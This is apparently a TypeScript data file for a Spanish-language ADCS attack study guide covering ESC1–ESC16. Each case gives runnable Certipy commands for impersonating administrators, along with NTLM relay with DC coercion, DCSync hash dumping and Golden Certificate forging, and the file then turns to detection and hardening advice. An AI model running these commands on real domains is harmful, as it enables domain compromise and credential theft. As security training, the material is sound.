import type {
  BlueTeamRow,
  CheatSheet,
  DecisionTable,
  EscCase,
  EscGroupMeta,
  PatchContext,
} from "./types";

export const groups: EscGroupMeta[] = [
  {
    id: "plantilla",
    label: "Fallo en la plantilla",
    description: "El problema está en cómo está configurada una plantilla de certificado concreta.",
    escs: [1, 2, 3, 13, 15],
    color: "oklch(0.65 0.16 220)",
  },
  {
    id: "acl",
    label: "Permisos / ACL",
    description: "Tienes permisos de escritura donde no deberías: plantilla, objetos PKI o la CA.",
    escs: [4, 5, 7],
    color: "oklch(0.7 0.16 55)",
  },
  {
    id: "config-ca",
    label: "Configuración de la CA",
    description: "Un flag o configuración global de la CA hace vulnerable a todo el sistema.",
    escs: [6, 16],
    color: "oklch(0.75 0.15 300)",
  },
  {
    id: "relay",
    label: "Relay de servicio",
    description: "La CA acepta autenticación NTLM y se puede relayear por HTTP o RPC.",
    escs: [8, 11],
    color: "oklch(0.6 0.18 25)",
  },
  {
    id: "mapping",
    label: "Mapping de certificado",
    description: "El DC asocia mal el certificado a una cuenta, permitiendo suplantación.",
    escs: [9, 10, 14],
    color: "oklch(0.7 0.14 160)",
  },
  {
    id: "acceso-ca",
    label: "Acceso a la CA",
    description: "Caso aparte: ya tienes ejecución de código en el servidor de la CA.",
    escs: [12],
    color: "oklch(0.55 0.15 30)",
  },
];

export const escCases: EscCase[] = [
  {
    id: 1,
    name: "ESC1 — SAN arbitrario",
    shortName: "ESC1",
    group: "plantilla",
    frequency: 5,
    tagline: "El rey, el más común. Pones el SAN tú mismo y suplantas a cualquier usuario.",
    vulnerability: [
      "La plantilla permite que el enrollee especifique el Subject Alternative Name (SAN).",
      "La plantilla sirve para autenticación (Client Authentication EKU).",
      "Requires Manager Approval está desactivado.",
      "El atacante tiene derechos de enrollement (por ejemplo, Domain Users).",
    ],
    detection:
      "ESC1 : 'CORP.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication",
    attack: [
      "# Pedir un certificado a nombre del objetivo (administrator)",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_VULN' \\",
      "  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'",
      "",
      "# Autenticarse con el certificado para obtener el NT hash",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Requisitos: Enrollee Supplies Subject = True, Client Authentication, Manager Approval = False, y Enrollment Rights para el atacante.",
      "En entornos parcheados con KB5014754, el auth puede fallar si no se incluye el -sid del objetivo.",
    ],
  },
  {
    id: 2,
    name: "ESC2 — Any Purpose / sin EKU",
    shortName: "ESC2",
    group: "plantilla",
    frequency: 3,
    tagline:
      "Plantilla con EKU 'Any Purpose' o sin EKU: el certificado sirve para cualquier cosa, incluido actuar como Enrollment Agent.",
    vulnerability: [
      "La plantilla tiene el EKU 'Any Purpose' (OID 2.5.29.37.0) o no tiene ningún EKU.",
      "El certificado emitido sirve para cualquier propósito, incluida la autenticación.",
      "Any Purpose incluye el EKU Certificate Request Agent (OID 1.3.6.1.4.1.311.20.2.1): por eso Certipy a menudo marca la misma plantilla como ESC2 y ESC3 a la vez.",
    ],
    detection: "ESC2 : Template can be used for any purpose.",
    attack: [
      "# 1. Pedir el certificado 'Any Purpose' (tu certificado de agente)",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_ANYPURPOSE'",
      "",
      "# 2. Usarlo para pedir un cert EN NOMBRE de Administrator",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User' \\",
      "  -pfx user.pfx -on-behalf-of 'CORP\\\\administrator'",
      "",
      "# 3. auth con el certificado del administrator",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Sub-caso de ESC3: Certipy solapa ESC2/ESC3 porque Any Purpose implica Certificate Request Agent. El flujo de abuso es el mismo (-on-behalf-of).",
      "Diferencia con ESC1: no puedes poner el SAN, pero puedes usar el cert como agente.",
    ],
  },
  {
    id: 3,
    name: "ESC3 — Enrollment Agent",
    shortName: "ESC3",
    group: "plantilla",
    frequency: 3,
    tagline:
      "Plantilla con el EKU Certificate Request Agent. Pides certs en nombre de otros usuarios.",
    vulnerability: [
      "La plantilla tiene el EKU 'Certificate Request Agent' (OID 1.3.6.1.4.1.311.20.2.1).",
      "Un Enrollment Agent puede pedir certificados en nombre de otros usuarios.",
    ],
    detection: "ESC3 : Template has Certificate Request Agent EKU set.",
    attack: [
      "# 1. Pedir el certificado de Enrollment Agent",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'ESC3-Agent'",
      "",
      "# 2. Usar el agente para pedir un cert en nombre de Administrator",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User' \\",
      "  -pfx user.pfx -on-behalf-of 'CORP\\\\administrator'",
      "",
      "# 3. auth",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "El parámetro -on-behalf-of es el corazón del ataque: indica a nombre de quién pides el certificado.",
      "Es una función legítima de ADCS mal restringida.",
    ],
  },
  {
    id: 4,
    name: "ESC4 — Escritura sobre la plantilla",
    shortName: "ESC4",
    group: "acl",
    frequency: 4,
    tagline:
      "Tienes permisos de escritura sobre una plantilla. La conviertes en ESC1, la explotas y la restauras.",
    vulnerability: [
      "Tienes permisos peligrosos sobre una plantilla: WriteProperty, GenericWrite, GenericAll, WriteDacl o WriteOwner.",
      "No es que la plantilla sea vulnerable, es que tú puedes editarla para hacerla vulnerable.",
    ],
    detection:
      "ESC4 : 'CORP.LOCAL\\\\user' has dangerous permissions (WriteProperty / GenericWrite / GenericAll / WriteDacl / WriteOwner)",
    attack: [
      "# 1. Hacer la plantilla vulnerable (Certipy v5 hace backup automático a .json)",
      "certipy-ad template -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -template 'PLANTILLA' -write-default-configuration",
      "cp PLANTILLA.json backup_seguro.json",
      "",
      "# 2. Explotar como ESC1",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA' \\",
      "  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
      "",
      "# 3. RESTAURAR (obligatorio)",
      "certipy-ad template -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -template 'PLANTILLA' -write-configuration PLANTILLA.json -no-save",
    ],
    notes: [
      "Siempre restaurar la plantilla al terminar para no romper la PKI.",
      "Certipy v5 realiza un backup automático, pero conviene hacer una copia extra manual.",
    ],
  },
  {
    id: 5,
    name: "ESC5 — ACL sobre objetos ADCS",
    shortName: "ESC5",
    group: "acl",
    frequency: 2,
    tagline:
      "Permisos débiles sobre objetos ADCS que no son plantillas: CA, NTAuthCertificates, contenedores PKI.",
    vulnerability: [
      "Control sobre el objeto del servidor CA en Active Directory.",
      "Control sobre el contenedor NTAuthCertificates (define qué CAs son de confianza).",
      "Control sobre objetos de contenedores de PKI (CN=Public Key Services).",
    ],
    detection:
      "find marca permisos peligrosos sobre objetos CA/PKI. La enumeración fina se hace con BloodHound o consultando ACLs.",
    attack: [
      "# No hay un comando único. El abuso depende del objeto controlado:",
      "#  - Control sobre NTAuthCertificates → añadir tu propia CA maliciosa.",
      "#  - Control sobre el objeto CA → posible derivación a ESC7.",
      "#  - Control sobre una plantilla vía este objeto → ESC4.",
      "",
      "# Enumerar con BloodHound las aristas sobre objetos ADCS.",
      "# Ejemplo conceptual de escritura de ACL (con herramientas como dacledit):",
      "dacledit -d corp.local -u user -p pass -dc-ip \"$DC_IP\" --target 'CN=...,CN=Public Key Services' ...",
    ],
    notes: [
      "ESC5 es el cajón de sastre de las ACLs: cualquier objeto PKI cuyo control te dé poder sobre el sistema de certificados.",
      "Se razona con el grafo de BloodHound, no con un solo comando.",
    ],
  },
  {
    id: 6,
    name: "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2",
    shortName: "ESC6",
    group: "config-ca",
    frequency: 3,
    tagline:
      "La CA tiene activado el flag EDITF_ATTRIBUTESUBJECTALTNAME2: acepta SAN arbitrario en cualquier solicitud.",
    vulnerability: [
      "La CA tiene el flag EDITF_ATTRIBUTESUBJECTALTNAME2 activado.",
      "Con este flag, la CA acepta un SAN arbitrario incluso si la plantilla no lo permite.",
    ],
    detection: "ESC6 : Certificate Authority has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set.",
    attack: [
      "# Pides un certificado con cualquier plantilla de auth (por ejemplo, User) + SAN arbitrario",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User' \\",
      "  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'",
      "",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Con EDITF_ATTRIBUTESUBJECTALTNAME2, ESC6 permite inyectar el SID del objetivo en el SAN (formato URL=tag:microsoft.com,2022-09-14:sid:<VALUE>). Eso fuerza al KDC a mapear por ese SID incluso con Full Enforcement (StrongCertificateBindingEnforcement=2).",
      "ESC6 sí funciona solo contra DCs totalmente parcheados: no necesita combinarse con ESC9/10/16. Las cadenas ESC6+ESC9 o ESC6+ESC16 existen por otras razones (ausencia de extensión SID), no porque ESC6 'no baste'.",
    ],
  },
  {
    id: 7,
    name: "ESC7 — Permisos sobre la CA",
    shortName: "ESC7",
    group: "acl",
    frequency: 4,
    tagline:
      "Tienes ManageCA o ManageCertificates sobre la CA. Te conviertes en officer, habilitas SubCA y apruebas tu propia solicitud.",
    vulnerability: [
      "Tienes el permiso ManageCA sobre la CA.",
      "Con ManageCA + ManageCertificates puedes gestionar plantillas y aprobar solicitudes.",
    ],
    detection:
      "ESC7 : 'CORP.LOCAL\\\\user' has dangerous permissions (ManageCA / ManageCertificates)",
    attack: [
      "# Añadirte como officer (si solo tienes ManageCA)",
      "certipy-ad ca -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -ca 'CA-NAME' -add-officer 'user'",
      "",
      "# Habilitar la plantilla SubCA",
      "certipy-ad ca -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -ca 'CA-NAME' -enable-template 'SubCA'",
      "",
      "# Pedir con SubCA (te lo deniegan → anotas el Request ID)",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -target \"$CA_HOST\" \\",
      "  -ca 'CA-NAME' -template 'SubCA' -upn 'administrator@corp.local' -sid 'S-1-...-500'",
      "",
      "# Aprobar tú mismo la solicitud fallida",
      "certipy-ad ca -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -ca 'CA-NAME' -issue-request <ID>",
      "",
      "# Recuperar el certificado emitido",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" -target \"$CA_HOST\" \\",
      "  -ca 'CA-NAME' -retrieve <ID>",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Con ManageCA puedes activar el flag de ESC6 o añadirte como officer.",
      "Con ManageCA + ManageCertificates puedes aprobar solicitudes fallidas (abuso de SubCA).",
    ],
  },
  {
    id: 8,
    name: "ESC8 — NTLM relay a Web Enrollment",
    shortName: "ESC8",
    group: "relay",
    frequency: 5,
    tagline:
      "La CA expone Web Enrollment por HTTP y acepta NTLM relay. Fuerzas a un DC a autenticarse contra ti y relayeas a la web.",
    vulnerability: [
      "La CA tiene habilitada la interfaz web de inscripción (http://ca/certsrv/).",
      "Acepta autenticación NTLM y no fuerza HTTPS ni Channel Binding (EPA).",
    ],
    detection: "ESC8 : Web Enrollment is enabled and Channel Binding is not enforced (o HTTP)",
    attack: [
      "# Terminal 1: Certipy en modo relay",
      "certipy-ad relay -target 'http://CA_IP' -template 'DomainController'",
      "",
      "# Terminal 2: coerción del DC (2026: Coercer agrupa varios métodos)",
      "coercer coerce -u user -p pass -d corp.local -t DC_IP -l ATACANTE_IP",
      "# Alternativas: PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM).",
      "# Clásico (a menudo parcheado): python3 PetitPotam.py ATACANTE_IP DC_IP",
      "",
      "# dc.pfx → auth → hash del DC$ → DCSync",
      'certipy-ad auth -pfx dc.pfx -dc-ip "$DC_IP"',
      "impacket-secretsdump -hashes ':DC_HASH' 'corp.local/DC$@DC_IP' -just-dc",
    ],
    notes: [
      "Certipy v5 mejora ESC8: comprueba HTTPS y si Channel Binding está forzado.",
      "Puede relayar incluso a endpoints HTTPS si no hay EPA.",
      "PetitPotam (MS-EFSRPC) está parcheado en muchos entornos; prioriza Coercer u otros métodos de coerción.",
    ],
  },
  {
    id: 9,
    name: "ESC9 — Sin extensión de seguridad SID",
    shortName: "ESC9",
    group: "mapping",
    frequency: 2,
    tagline:
      "La plantilla no incluye la extensión de seguridad SID. El mapping es débil y se abusa manipulando el UPN.",
    vulnerability: [
      "La plantilla tiene el flag CT_FLAG_NO_SECURITY_EXTENSION.",
      "El certificado emitido NO lleva el SID real del solicitante.",
      "Combinado con control sobre una cuenta víctima, permite suplantación por UPN.",
    ],
    detection:
      "ESC9 : Template has CT_FLAG_NO_SECURITY_EXTENSION flag (no szOID_NTDS_CA_SECURITY_EXT)",
    attack: [
      "# Escenario: controlas 'victima' (por ejemplo, GenericWrite sobre ella)",
      "# 1. Cambiar el UPN de 'victima' al del objetivo (sin @)",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'administrator'",
      "",
      "# 2. Pedir el cert como 'victima' con la plantilla ESC9",
      "certipy-ad req -u 'victima@corp.local' -p 'victima_pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_ESC9'",
      "",
      "# 3. Restaurar el UPN de 'victima'",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'victima@corp.local'",
      "",
      "# 4. auth (se mapea al administrator por UPN)",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP" -domain corp.local',
    ],
    notes: [
      "Requiere control sobre una cuenta víctima (por ejemplo, poder cambiarle el UPN).",
      "Es un bypass del mapping fuerte introducido por KB5014754.",
      "Temporal (lab 2026): el mapping débil quedó inutilizable con Full Enforcement obligatorio desde septiembre de 2025 (Microsoft). Este vector solo aplica si el entorno aún no lo fuerza.",
    ],
  },
  {
    id: 10,
    name: "ESC10 — Mapping débil de certificados",
    shortName: "ESC10",
    group: "mapping",
    frequency: 2,
    tagline:
      "El registro del DC permite mapping débil por UPN. Similar a ESC9, pero el fallo está en la configuración del DC.",
    vulnerability: [
      "CertificateMappingMethods permite mapping débil por UPN.",
      "StrongCertificateBindingEnforcement = 0 desactiva el mapping fuerte.",
      "El fallo está en el registro del DC, no en un flag de plantilla.",
    ],
    detection:
      "ESC10 : Weak certificate mapping (CertificateMappingMethods / StrongCertificateBindingEnforcement)",
    attack: [
      "# 1. Cambiar el UPN de una cuenta que controlas al del objetivo",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'administrator'",
      "",
      "# 2. Pedir un cert como 'victima' con cualquier plantilla de auth",
      "certipy-ad req -u 'victima@corp.local' -p 'victima_pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User'",
      "",
      "# 3. Restaurar el UPN",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'victima@corp.local'",
      "",
      "# 4. auth (mapping por UPN)",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "ESC9 vs ESC10: ESC9 es fallo en la plantilla; ESC10 es fallo en el registro del DC.",
      "Ambos se explotan igual: manipulando el UPN de una cuenta que controlas.",
      "Temporal (lab 2026): depende de que el entorno no aplique Full Enforcement obligatorio desde sept-2025.",
    ],
  },
  {
    id: 11,
    name: "ESC11 — Relay a la interfaz RPC (ICPR)",
    shortName: "ESC11",
    group: "relay",
    frequency: 2,
    tagline:
      "La interfaz RPC de la CA (MS-ICPR) no exige cifrado. Se puede relayar NTLM por RPC para pedir certs.",
    vulnerability: [
      "La interfaz ICPR (Internal Certificate Processing) de la CA no exige cifrado.",
      "IF_ENFORCEENCRYPTICERTREQUEST está desactivado.",
    ],
    detection: "ESC11 : Encryption is not enforced for ICPR requests (relay to RPC possible)",
    attack: [
      "# Relay a la interfaz RPC de la CA",
      "certipy-ad relay -target 'rpc://CA_IP' -ca 'CA-NAME' -template 'DomainController'",
      "",
      "# + coerción del objetivo (preferir Coercer en labs 2026)",
      "coercer coerce -u user -p pass -d corp.local -t DC_IP -l ATACANTE_IP",
      "# Clásico (a menudo parcheado): python3 PetitPotam.py ATACANTE_IP DC_IP",
      "",
      "# → cert del objetivo → auth → hash",
      'certipy-ad auth -pfx dc.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Como ESC8 pero por RPC en vez de HTTP.",
      "Certipy comprueba la propiedad enforce_encrypt_icertrequest de la CA.",
      "PetitPotam (MS-EFSRPC) está parcheado en muchos entornos; prioriza Coercer (MS-RPRN / DFSCoerce / EFSRPC).",
    ],
  },
  {
    id: 12,
    name: "ESC12 — Shell en la CA (YubiHSM)",
    shortName: "ESC12",
    group: "acceso-ca",
    frequency: 1,
    tagline:
      "Ya tienes shell en el servidor de la CA. Si la clave privada está en un YubiHSM con el PIN accesible, forjas certs (Golden Certificate).",
    vulnerability: [
      "La clave privada de la CA está en un YubiHSM (módulo de seguridad hardware).",
      "El PIN del HSM suele estar almacenado para que el servicio arranque sin intervención.",
      "Requiere ejecución de código previa en el servidor de la CA.",
    ],
    detection:
      "Certipy NO detecta ni explota ESC12 directamente. Se identifica tras conseguir shell en la CA.",
    attack: [
      "# Una vez con shell en la CA, acceder a la clave vía el YubiHSM",
      "# El PIN suele estar en la configuración del servicio o accesible en memoria.",
      "",
      "# Con la clave de la CA → Golden Certificate",
      "certipy-ad forge -ca-pfx 'CA.pfx' -upn 'administrator@corp.local' \\",
      "  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'",
    ],
    notes: [
      "ESC12 no es escalada remota: es post-explotación una vez dentro de la CA.",
      "Golden Certificate permite forjar cualquier certificado válido.",
    ],
  },
  {
    id: 13,
    name: "ESC13 — Issuance policy con OID de grupo",
    shortName: "ESC13",
    group: "plantilla",
    frequency: 2,
    tagline:
      "La plantilla tiene una issuance policy vinculada a un grupo privilegiado. El cert te concede esos privilegios al autenticarte.",
    vulnerability: [
      "La plantilla tiene una issuance policy (OID) vinculada a un grupo de AD.",
      "El atributo msDS-OIDToGroupLink enlaza el OID con el grupo.",
      "El certificado emitido concede membresía efectiva del grupo durante la autenticación.",
    ],
    detection:
      "ESC13 : Template has an issuance policy linked to a privileged group (OID group link)",
    attack: [
      "# 1. Pedir el cert de la plantilla con la issuance policy privilegiada",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_ESC13'",
      "",
      "# 2. auth → el TGT incluye la membresía del grupo privilegiado",
      'certipy-ad auth -pfx user.pfx -dc-ip "$DC_IP"',
      "",
      "# Ver con BloodHound qué privilegios tiene el grupo enlazado al OID",
    ],
    notes: [
      "Certipy detecta ESC13, pero BloodHound te dice qué privilegios te da el grupo enlazado.",
      "No hace falta tocar el SAN ni el UPN.",
    ],
  },
  {
    id: 14,
    name: "ESC14 — Mapping explícito débil (altSecurityIdentities)",
    shortName: "ESC14",
    group: "mapping",
    frequency: 2,
    tagline:
      "El atributo altSecurityIdentities mapea explícitamente un certificado a una cuenta. Si es débil y editable, puedes suplantar.",
    vulnerability: [
      "El atributo altSecurityIdentities permite mapear explícitamente un certificado a una cuenta.",
      "Configurado de forma débil (por ejemplo, por issuer+subject en vez de campos fuertes).",
      "Requiere permisos de escritura sobre altSecurityIdentities de una cuenta.",
    ],
    detection:
      "Certipy NO detecta ESC14 directamente. Se identifica con BloodHound (escritura sobre altSecurityIdentities).",
    attack: [
      "# 1. Descubrir con BloodHound que puedes escribir altSecurityIdentities en una cuenta privilegiada.",
      "# 2. Escribir un mapping explícito débil que asocie tu cert a esa cuenta (vía LDAP).",
      "",
      "# Ejemplo conceptual con bloodyAD:",
      "bloodyAD -u user -p pass -d corp.local --host DC_IP set object victima \\",
      "  altSecurityIdentities -v 'X509:<I>...<S>...'",
      "",
      "# 3. Autenticarte con tu cert → el DC lo mapea a la cuenta privilegiada.",
    ],
    notes: [
      "Se identifica mejor con BloodHound y se explota manualmente vía LDAP.",
      "Requiere permisos de escritura sobre altSecurityIdentities de la víctima.",
      "Temporal (lab 2026): el mapping débil quedó inutilizable con Full Enforcement obligatorio desde septiembre de 2025. Este vector solo aplica si el entorno aún no lo fuerza.",
    ],
  },
  {
    id: 15,
    name: "ESC15 — EKUwu (application policies en CSR)",
    shortName: "ESC15",
    group: "plantilla",
    frequency: 2,
    tagline:
      "Afecta a plantillas v1. Inyectas application policies (EKU de Client Auth) en tu propia CSR y conviertes una plantilla inofensiva en ESC1.",
    vulnerability: [
      "Afecta a plantillas de esquema versión 1.",
      "Aunque la plantilla no tenga EKU de autenticación, el solicitante puede inyectar application policies en la CSR.",
      "Descubierto por TrustedSec (octubre 2024), apodado 'EKUwu'.",
    ],
    detection:
      "ESC15 : Enrollee supplies subject on a v1 template (application policies injectable / EKUwu)",
    attack: [
      "# Inyectar application policy de Client Authentication en una plantilla v1",
      "certipy-ad req -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'PLANTILLA_V1' \\",
      "  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \\",
      "  -application-policies '1.3.6.1.5.5.7.3.2'",
      "",
      "# 1.3.6.1.5.5.7.3.2 = Client Authentication",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Solo plantillas v1. En v2+ la CA no acepta application policies inyectadas desde el CSR.",
      "Actualizar plantillas v1 a v2+ mitiga EKUwu.",
    ],
  },
  {
    id: 16,
    name: "ESC16 — CA sin extensión SID global",
    shortName: "ESC16",
    group: "config-ca",
    frequency: 2,
    tagline:
      "La CA no aplica la extensión de seguridad SID globalmente. Es como ESC9 pero a nivel de toda la CA.",
    vulnerability: [
      "La CA está configurada para NO incluir la extensión de seguridad SID en ningún certificado.",
      "Nuevo en Certipy v5 (2025).",
      "El mapping es débil para todos los certs emitidos por la CA.",
    ],
    detection:
      "ESC16 : CA disables the SID security extension globally (szOID_NTDS_CA_SECURITY_EXT)",
    attack: [
      "# 1. Cambiar el UPN de una cuenta que controlas al del objetivo",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'administrator'",
      "",
      "# 2. Pedir un cert como 'victima' con cualquier plantilla de auth",
      "certipy-ad req -u 'victima@corp.local' -p 'victima_pass' -dc-ip \"$DC_IP\" \\",
      "  -target \"$CA_HOST\" -ca 'CA-NAME' -template 'User'",
      "",
      "# 3. Restaurar el UPN",
      "certipy-ad account update -u 'user@corp.local' -p 'pass' -dc-ip \"$DC_IP\" \\",
      "  -user 'victima' -upn 'victima@corp.local'",
      "",
      "# 4. auth",
      'certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"',
    ],
    notes: [
      "Como ESC9 pero a nivel global de la CA, no de una plantilla concreta.",
      "Cualquier plantilla de auth emitida por la CA se vuelve abusable con manipulación de UPN.",
      "Temporal (lab 2026): depende de que el entorno no aplique Full Enforcement obligatorio desde sept-2025.",
    ],
  },
];

export const patchContext: PatchContext = {
  title: "El parche KB5014754, ESC6 y el mapping fuerte",
  paragraphs: [
    "Antes de mayo de 2022, los certificados se mapeaban a cuentas por UPN/SAN (mapping débil). Por eso ESC1 funcionaba 'a secas': ponías SAN=Administrator y el DC te mapeaba al Administrator.",
    "El parche KB5014754 ('Certifried') introdujo la extensión de seguridad SID (szOID_NTDS_CA_SECURITY_EXT): el certificado embebe el SID real del solicitante. El DC comprueba si el SID del cert coincide con la cuenta que dice ser. Esto es el mapping fuerte.",
    "ESC1 en entornos parcheados: si solo pones el UPN/SAN sin el SID del objetivo, el auth falla porque el SID del solicitante delata que no eres el admin. Por eso Certipy pide `-sid` del objetivo.",
    "ESC6 es distinto: con EDITF_ATTRIBUTESUBJECTALTNAME2 activo, puedes inyectar el SID malicioso dentro del SAN (URL=tag:microsoft.com,2022-09-14:sid:<VALUE>). Eso fuerza el mapeo incluso con Full Enforcement (StrongCertificateBindingEnforcement=2). ESC6 funciona solo; no requiere ESC9/10/16.",
    "ESC9, ESC10 y ESC16 son bypasses de mapping débil: evitan o desactivan la extensión SID para volver al mapping por UPN. Desde septiembre de 2025 Microsoft hace Full Enforcement obligatorio; estos vectores solo aplican si el entorno aún no lo fuerza.",
  ],
  rule: [
    "ESC6 con EDITF activo: funciona solo incluso con Full Enforcement (SID inyectado en el SAN).",
    "ESC1 en entornos parcheados: usa `-sid` del objetivo; si el auth falla, revisa mapping (ESC9/10/16) o el flag -sid.",
    "ESC9/10/14/16: dependen de mapping débil — inutilizables si Full Enforcement es obligatorio (sept-2025+).",
    "El flag -sid en los req embebe el SID correcto del objetivo cuando el mapping fuerte aplica.",
  ],
  whySid:
    "El flag -sid 'S-1-5-21-...-500' embebe el SID del objetivo en el certificado. En ESC6, Certipy usa el mecanismo del SAN con SID embebido que el flag EDITF permite. Si el auth falla tras un req que parecía correcto, revisa el -sid o si estás ante un caso de mapping débil (ESC9/10/16).",
};

export const decisionTable: DecisionTable = {
  title: "Tabla de decisión: 'find me dice X, ¿qué hago?'",
  steps: [
    "certipy-ad find -u 'user@dom' -p 'pass' -dc-ip IP -vulnerable -stdout",
    "Busca el ESC en la tabla → metodología.",
    "Ve a su sección del lab → comando exacto.",
    "Ejecuta. Si falla el auth → revisa el -sid y el parche.",
    "Si es de mapping (9/10/16) → manipula el UPN. Si es de relay (8/11) → necesitas coerción. Si es de ACL (4/5/7) → primero modificas algo.",
  ],
  rows: [
    { esc: 1, action: "req con -upn admin -sid → auth" },
    { esc: 2, action: "req (agente) → req -on-behalf-of → auth" },
    { esc: 3, action: "req (agente) → req -on-behalf-of → auth" },
    { esc: 4, action: "template -write-default-config → ESC1 → restaurar" },
    { esc: 5, action: "abuso de ACL sobre objeto PKI (BloodHound)" },
    {
      esc: 6,
      action: "req -template User -upn admin -sid → auth (ESC6 basta solo; SID en SAN vía EDITF)",
    },
    {
      esc: 7,
      action: "ca -add-officer / -enable-template SubCA → issue-request → retrieve → auth",
    },
    { esc: 8, action: "relay http:// + coerción → auth (DC$)" },
    { esc: 9, action: "account update -upn + req + restaurar → auth" },
    { esc: 10, action: "account update -upn + req + restaurar → auth (fallo en registro del DC)" },
    { esc: 11, action: "relay rpc:// + coerción → auth" },
    { esc: 12, action: "shell en la CA → forge (Golden Cert)" },
    { esc: 13, action: "req plantilla con OID de grupo → auth (+ BloodHound)" },
    { esc: 14, action: "escribir altSecurityIdentities (LDAP) → auth (BloodHound)" },
    { esc: 15, action: "req -application-policies + -upn -sid → auth (plantilla v1, EKUwu)" },
    { esc: 16, action: "account update -upn + req + restaurar → auth (CA sin SID global)" },
  ],
};

export const blueTeam: BlueTeamRow[] = [
  {
    group: "plantilla",
    detection: [
      "Eventos 4886/4887 con SAN/EKU que no cuadra con el solicitante.",
      "Certificados con application policies inyectadas.",
    ],
    hardening: [
      "Quitar 'Enrollee Supplies Subject' de plantillas de autenticación.",
      "No usar EKU 'Any Purpose' ni dejar el EKU vacío.",
      "Restringir el EKU 'Certificate Request Agent' y los enrollment agents.",
      "Requerir aprobación del manager en plantillas sensibles.",
      "Revisar issuance policies enlazadas a grupos (msDS-OIDToGroupLink).",
      "Actualizar plantillas v1 a v2+ (mitiga EKUwu/ESC15).",
    ],
  },
  {
    group: "acl",
    detection: [
      "Eventos 4899/4900 (plantilla modificada).",
      "Cambios en ACLs de objetos PKI / de la CA.",
    ],
    hardening: [
      "Auditar con BloodHound quién tiene WriteDacl/GenericAll/GenericWrite sobre plantillas, la CA y objetos PKI.",
      "Restringir ManageCA/ManageCertificates a administradores de PKI.",
    ],
  },
  {
    group: "config-ca",
    detection: ["Flag EDITF_ATTRIBUTESUBJECTALTNAME2 activado.", "CA sin extensión SID global."],
    hardening: [
      "Quitar el flag EDITF_ATTRIBUTESUBJECTALTNAME2.",
      "Asegurar que la CA aplica la extensión de seguridad SID globalmente.",
    ],
  },
  {
    group: "relay",
    detection: [
      "Coerción (Coercer / PrinterBug / DFSCoerce / PetitPotam) seguida de autenticación del DC$ a la CA.",
      "Peticiones ICPR sin cifrado.",
    ],
    hardening: [
      "Deshabilitar Web Enrollment o forzar HTTPS + Channel Binding (EPA).",
